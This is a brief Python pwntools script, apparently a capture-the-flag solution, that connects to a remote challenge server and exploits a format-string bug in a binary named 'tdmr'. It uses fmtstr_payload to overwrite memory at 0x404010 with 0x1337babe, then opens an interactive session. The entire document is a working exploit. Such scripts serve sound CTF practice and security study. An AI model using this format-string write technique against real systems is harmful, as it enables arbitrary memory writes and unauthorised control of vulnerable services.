from pwn import *   

elf = context.binary = ELF('./tdmr')

# pr = process()
pr = remote('94.237.53.146',34450)

pr.recvuntil(b'>>')
pr.sendline(b'3')

pr.recvuntil(b'it: ')
payload = fmtstr_payload(6, {0x404010: 0x1337babe}, write_size='short')
print(len(payload))
pr.sendline(payload)
pr.interactive()